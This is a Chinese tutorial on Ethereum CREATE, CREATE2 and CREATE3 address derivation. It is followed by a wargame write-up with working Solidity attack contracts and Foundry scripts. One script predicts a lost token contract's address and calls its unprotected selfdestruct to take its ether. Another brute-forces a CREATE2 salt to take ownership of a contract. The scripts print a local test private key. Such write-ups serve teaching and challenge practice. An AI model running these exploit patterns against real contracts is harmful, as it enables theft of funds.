# Create&Create2&Create3的基本原理及其题目应用 副本

# 写在前面

* 介绍 create 以及 create2 的基本原理
* 介绍 create3 原理和一个简单的说明例子
* 基于 create 的原理做靶场题目
* 基于 create2 的原理做一个简单的修饰符题目

首先明确，create和create2操作码都是**在合约中创建新合约**的方法，是solidity语言中一个强大的功能

在以太坊链上，用户(外部账户,`EOA`)可以创建智能合约，智能合约同样也可以创建新的智能合约

# <font style="color:rgb(51, 51, 51);">nonce</font>

<font style="color:rgb(51, 51, 51);">EIP161规定合约</font><code><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">nonce</font></code>**<font style="color:rgb(51, 51, 51);">从1开始</font>**<font style="color:rgb(51, 51, 51);">（在EIP161之前,nonce从 0 开始）。</font>**<font style="color:rgb(51, 51, 51);">只有当</font>****<font style="color:rgb(51, 51, 51);background-color:#D9DFFC;">该合约</font>****<font style="color:rgb(51, 51, 51);">创建另一个Contract时，</font>****<font style="color:rgb(51, 51, 51);background-color:#D9DFFC;">该合约</font>****<font style="color:rgb(51, 51, 51);">的 nonce 才会递增</font>**

**<font style="color:rgb(51, 51, 51);">合约没有内置方法来访问账户的 nonce</font>**<font style="color:rgb(51, 51, 51);">，包括它自己的 nonce。（Contract 可以使用其存储来跟踪自己的 nonce.</font>

<code><font style="color:rgb(51, 51, 51);">nonce</font></code><font style="color:rgb(51, 51, 51);">是不可重复使用的，且必须按照顺序来用.</font>

<font style="color:rgb(51, 51, 51);">每笔交易都必须有唯一且递增的 nonce，网络只接受下一笔有效 nonce 的交易，这就</font>**<font style="color:rgb(51, 51, 51);">天然防止了双花攻击</font>**<font style="color:rgb(51, 51, 51);">，因为不能同时发出两笔 nonce 相同的交易。  </font>

<font style="color:rgb(51, 51, 51);">在 create3 还会涉及到</font>**<font style="color:rgb(51, 51, 51);">合约自毁后nonce清零</font>**<font style="color:rgb(51, 51, 51);">的情况，到时候会通过一个例子简单介绍</font>

# Create

## 新建新合约地址的计算规则：

```solidity
new_address = hash(msg.sender, nonce)
```

<font style="color:rgb(51, 51, 51);">每个账户都有一个相应的</font><code><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">nonce</font></code><font style="color:rgb(51, 51, 51);">，合约每创建一个新合约，它的</font>**<font style="color:rgb(51, 51, 51);">nonce+1</font>**<font style="color:rgb(51, 51, 51);">.</font>

## 用法

```solidity
Contract x = new Contract{value: _value}(params)
```

<font style="color:rgb(51, 51, 51);">应用场景：已知</font><code><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">nonce</font></code><font style="color:rgb(51, 51, 51);">和msg.sender，在合约中创建新合约</font>

## <font style="color:rgb(51, 51, 51);">缺点</font>

<font style="color:rgb(33, 42, 54);">创建者地址不会变，但</font><code><font style="color:rgb(107, 114, 128);background-color:#FBDFEF;">nonce</font></code><font style="color:rgb(33, 42, 54);">并不稳定，因此用create创建的合约地址不好预测</font>

# Create2

## 优势

`CREATE2`的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，都可以把合约部署在事先计算好的地址上。像`Uniswap`创建`Pair`合约用的就是create2而不是create。

## 新合约地址推导公式：

```solidity
new_address = hash(0xFF, 创建者地址(CreatorAddress), salt, bytecode)
```

* <code><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">0xFF</font></code><font style="color:rgb(51, 51, 51);">：固定常量,不能改,用于避免与create冲突</font>
* <code><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">sender</font></code><font style="color:rgb(51, 51, 51);">：调用 CREATE2 的当前合约（创建合约）地址</font>
* <code><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">salt</font></code><font style="color:rgb(51, 51, 51);">：一个创建者指定的</font><code><font style="color:rgb(51, 51, 51);">bytes32</font></code><font style="color:rgb(51, 51, 51);">类型的值</font>
* <code><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">bytecode</font></code><font style="color:rgb(51, 51, 51);">：新合约的</font>**初始字节码**

<font style="color:rgb(51, 51, 51);">新合约的地址</font>**<font style="color:rgb(51, 51, 51);">由 salt 值和合约创建代码的组合确定</font>**<font style="color:rgb(51, 51, 51);">，也就是说使用相同的 salt 值和合约创建代码时，无论使用何种部署节点，生成的合约都将始终显示相同的地址</font>

<font style="color:rgb(51, 51, 51);">这样,create2就能为新合约计算出一个</font>**<font style="color:rgb(51, 51, 51);">确定性</font>**<font style="color:rgb(51, 51, 51);">的地址,即使区块链演变,这个地址也保持不变</font>

## <font style="color:rgb(51, 51, 51);">用法</font>

```solidity
Contract x = new Contract{salt: _salt, value: _value}(params)
```

## 作用

1. **<font style="color:rgb(51, 51, 51);">改进的互操作性</font>**<font style="color:rgb(51, 51, 51);">：地址的确定性简化了不同智能合约或去中心化应用程序之间的协调和交互。这可以在复杂的去中心化系统中实现更高效、更无缝的互操作性。</font>
2. **<font style="color:rgb(51, 51, 51);">高效的状态通道和第 2 层扩容解决方案</font>**<font style="color:rgb(51, 51, 51);">：在状态通道和第 2 层扩容解决方案中，协调链下交易，CREATE2 地址的确定性可以简化合约地址的管理并提高这些扩容解决方案的效率。</font>
3. **<font style="color:rgb(51, 51, 51);">增强的安全性</font>**<font style="color:rgb(51, 51, 51);">：确定性地计算合约地址的能力可以通过允许各方在与合约交互之前验证和确认地址来增强安全性。这降低了地址生成过程中出现意外错误的风险。</font>
4. **<font style="color:rgb(51, 51, 51);">成本效益</font>**<font style="color:rgb(51, 51, 51);">：可预测的合约地址可能会节省 gas 费用。去中心化系统中的参与者可以规划和优化他们的交互，从而可能减少计算开销和相关成本。</font>
5. **<font style="color:rgb(51, 51, 51);">促进可升级性</font>**<font style="color:rgb(51, 51, 51);">：确定性地址在可升级的合约场景中可能是有利的。开发人员能够在相同的确定性地址部署合约的更新版本，从而通过无缝升级的版本简化用户和其他合约的交互。</font>
6. **<font style="color:rgb(51, 51, 51);">在去中心化金融 （DeFi） 中有用</font>**<font style="color:rgb(51, 51, 51);">：在部署各种需要精确寻址以实现 DeFi 生态系统内无缝集成的金融工具和智能合约时，DeFi 协议通常受益于 CREATE2 的确定性。</font>

# Create3

create3 和 create2 类似，但是在地址推导公式中不再包括合约的<font style="background-color:#FBDFEF;">initcode</font>，<font style="color:rgb(51, 51, 51);">可用于生成不与特定合约代码绑定的确定性合约地址。</font>

create3<font style="color:rgb(51, 51, 51);"> 是一种结合使用 </font>create<font style="color:rgb(51, 51, 51);"> 和 </font>create2<font style="color:rgb(51, 51, 51);"> 的方法，使</font><font style="color:rgb(51, 51, 51);background-color:#FBDFEF;">字节码</font><font style="color:rgb(51, 51, 51);">不再影响部署地址。但是比他俩更昂贵（固定额外成本约为 55k gas）。</font>

## <font style="color:rgb(51, 51, 51);">特点</font>

1. <font style="color:rgb(51, 51, 51);">基于</font>**<font style="color:rgb(51, 51, 51);">msg.sender + salt</font>**<font style="color:rgb(51, 51, 51);">的确定性合约地址。</font>
2. <font style="color:rgb(51, 51, 51);">相同的合约地址适用于不同的 EVM 网络。</font>
3. <font style="color:rgb(51, 51, 51);">支持任何兼容 EVM 的链，支持 CREATE2。</font>
4. <font style="color:rgb(51, 51, 51);">可支付的合约创建（转发到子合约）— 支持构造函数。</font>

<font style="color:rgb(51, 51, 51);">当目标是在多个区块链上部署合约到相同地址时，影响部署地址的因素较少，使得实现这一目标更容易。因此，在这种情况下，CREATE3 比 CREATE2 更好用。</font>

## 用法

```solidity
function create3(bytes32 _salt, bytes memory _creationCode) internal returns (address addr)
```

* **<font style="color:rgb(51, 51, 51);">\_salt</font>**<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">是 32 字节的哈希摘要，可以使用 keccak256 函数生成。</font>
* **<font style="color:rgb(51, 51, 51);">\_creationCode</font>**<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">是正在部署的合约的字节码。</font>

<font style="color:rgb(51, 51, 51);">尽管在参数中包含了 \_creationCode，但它并不用于确定部署地址，这使得这个 create3 API 与 CREATE2 和 CREATE 操作码有所区别。此细节在 API 的注释中也明确提到。</font>

## <font style="color:rgb(51, 51, 51);">create + create2 +自毁+ nonce清零 的联合</font>

1. <code>**EOA**</code>**用**<code>**CREATE**</code>**部署**<code>**A**</code>

\*\*2. \*\*<code>**A**</code>**用**<code>**CREATE2**</code>**部署**<code>**B**</code>

`B`的地址是可以提前预测的，因为`CREATE2`：

```plain
address = keccak256(0xFF ++ deployer ++ salt ++ keccak256(bytecode))[12:]
```

只要`salt`和`A`的地址不变，部署出的`B`地址就固定。

**3. **<code>**B**</code>**用**<code>**CREATE**</code>**部署**<code>**C**</code>**，并自毁自己**

`B`先内部调用`new C()`，用`CREATE`来创建一个`C`，然后调用`selfdestruct`销毁自身代码，`B`的nonce清零

**4. 再次用相同**<code>**salt**</code>**重复部署**<code>**B**</code>**，代码可以变**

因为`B`被`selfdestruct`了，地址**可重用**；

再次调用`A.create2(salt)`，可以重新部署一个**不同字节码**的`B`；新的`B`可以部署不同逻辑的`C`；

* 实现：**“同一个**<code>**C**</code>\*\*地址，可重复部署不同逻辑代码” \*\*

# 题目Recovery源码

目标：找到合约创建者部署的代币合约地址，并从中拿走这0.001ether

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);//create,没有提供salt
    } //recovery合约创建了一个新合约SimpleToken，nonce==1
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

```

合约的 nonce 从 1 开始，每 new 一个合约，nonce +1\
所以 Recovery new 的第一个合约的 nonce = 1

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {SimpleToken, Recovery} from "./Recovery.sol";

contract Attack {
    SimpleToken public simpletoken;
    address public predictaddr;

    constructor(address addr) {
        simpletoken = SimpleToken(payable(addr));
    }

    function jiyi(address addr) public returns (address) {
        predictaddr = address(
            uint160(
                uint(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),// RLP前缀，固定
                            bytes1(0x94),// 地址长度，20字节，固定
                            addr,//recovery地址
                            bytes1(0x01)// nonce = 1（创建第一个合约）
                        )
                    )
                )
            )
        );
        return predictaddr;
    }

    function attack() external {
        simpletoken = SimpleToken(payable(predictaddr));
        simpletoken.destroy(payable(msg.sender));
    }
}
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x0791d9BDA37a260530722bfC6FAafFdc30f82180);
        attack.jiyi(0x0791d9BDA37a260530722bfC6FAafFdc30f82180);
        attack.attack();
        vm.stopBroadcast();
    }
}
```

# 变式

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

//0x5FbDB2315678afecb367f032d93F642f64180aa3
contract Paekko {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier geek1() {
        require(uint256(uint160(msg.sender)) % 806 == 6);
        _;
    }

    function BecomeOwner(address addr) external geek1 {
        owner = addr;
    }
}

```

```solidity
 forge create Paekko --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Paekko} from "./Paekko.sol";
import {Attack} from "./Attack.sol";

contract Deployer {
    function computeSalt(address target) public view returns (bytes32) {
        for (uint256 i = 0; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (uint256(uint160(predictedAddress)) % 806 == 6) {
                return salt; // 找salt
            }
        }
        revert("No suitable salt found within the limit");
    }

    function predictAddress(
        bytes32 salt,
        address example
    ) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Attack).creationCode,
            abi.encode(example)
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this), // 部署者地址
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash))); //预测的地址
    }

    function deployer(
        bytes32 salt,
        address paekkoAddress
    ) public returns (address) {
        Attack a = new Attack{salt: salt}(paekkoAddress);
        return address(a);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Paekko} from "./Paekko.sol";

contract Attack {
    Paekko paekko;

    constructor(address addr) {
        paekko = Paekko(addr);
    }

    function attack(address addr) external {
        paekko.BecomeOwner(addr);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Deployer} from "../src/Deployer.sol";
import {Paekko} from "../src/Paekko.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Deployer deployer = new Deployer();
        Paekko paekko = Paekko(0xa513E6E4b8f2a923D98304ec87F64353C4D5C853);

        bytes32 salt = deployer.computeSalt(
            0xa513E6E4b8f2a923D98304ec87F64353C4D5C853
        );
        address attack = deployer.deployer(
            salt,
            0xa513E6E4b8f2a923D98304ec87F64353C4D5C853
        );
        Attack(attack).attack(address(attack));
        require(paekko.owner() == address(attack), "no");
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-09-25 18:16:51  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/oc6o0tla2t1cl1ns>